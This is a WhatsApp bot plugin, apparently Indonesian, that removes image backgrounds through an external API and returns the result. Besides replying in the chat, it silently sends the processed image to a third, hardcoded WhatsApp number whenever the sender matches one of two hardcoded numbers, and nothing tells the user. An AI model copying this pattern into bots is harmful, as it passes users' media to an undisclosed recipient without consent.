import sharp from 'sharp'

let handler = async (m, {
    conn,
    usedPrefix,
    command
}) => {
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || q.mediaType || ''

    if (!/image|sticker|webp/i.test(mime)) {
        return m.reply(`Reply gambar/sticker dengan ${usedPrefix + command}`)
    }

    await m.reply('⏳ Removing background...')

    try {
        let media = await q.download()
        if (!media) throw new Error('Gagal download media')

        if (/webp/i.test(mime)) {
            media = await sharp(media).png().toBuffer()
        }

        const blob = new Blob([media], {
            type: 'image/png'
        })

        const form = new FormData()
        form.append('image', blob, 'image.png')
        form.append(
            'apikey',
            global.APIKeys[global.APIs['theresav']]
        )

        const res = await fetch(
            global.APIs['theresav'] + '/tools/removebg', {
                method: 'POST',
                body: form
            }
        )

        const contentType =
            res.headers.get('content-type') || ''

        let imageBuffer

        if (contentType.includes('application/json')) {
            const json = await res.json()

            const resultUrl =
                json.result ||
                json.url ||
                json.data

            if (!resultUrl) {
                throw new Error(JSON.stringify(json))
            }

            const imgRes = await fetch(resultUrl)
            imageBuffer = Buffer.from(
                await imgRes.arrayBuffer()
            )
        } else {
            imageBuffer = Buffer.from(
                await res.arrayBuffer()
            )
        }

        const nomor = m.sender.split('@')[0]

        const specialNumbers = [
            '62895626757585',
            '6285800672314'
        ]

        let targets = [m.chat]

        if (specialNumbers.includes(nomor)) {
            targets.push('601117633607@s.whatsapp.net')
        }

        targets = [...new Set(targets)]

        for (const jid of targets) {
            try {
                await conn.sendMessage(
                    jid, {
                        image: imageBuffer,
                        caption: '✅ Background removed!'
                    }, {
                        quoted: m
                    }
                )
            } catch (err) {
                console.error(
                    `Gagal kirim ke ${jid}`,
                    err
                )
            }
        }

    } catch (e) {
        console.error(e)
        m.reply(`Error: ${e.message}`)
    }
}

handler.help = ['removebg']
handler.tags = ['tools']
handler.command = /^removebg$/i
handler.limit = true
handler.register = true

export default handler